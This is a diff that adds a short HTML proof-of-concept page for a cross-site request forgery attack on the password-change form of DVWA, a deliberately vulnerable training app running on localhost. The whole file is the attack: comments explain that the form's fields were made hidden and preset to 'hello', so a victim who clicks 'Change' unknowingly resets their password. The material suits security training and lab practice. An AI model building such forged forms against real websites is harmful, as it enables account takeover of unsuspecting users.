@@ -1,0 +1,12 @@
+<! This form is password change form in "http://localhost/dvwa/vulnerabilities/csrf/" >
+<! We change "tpye = password" to "hidden" and also set a "value" for password >
+<! so that user click submit button it change password >
+
+
+
+<form action="http://localhost/dvwa/vulnerabilities/csrf/?" method="GET">
+		<input type="hidden" AUTOCOMPLETE="off" name="password_new" value="hello"><br />
+		<input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="hello"><br />
+		<input type="submit" value="Change" name="Change">
+	</form>
+</div>
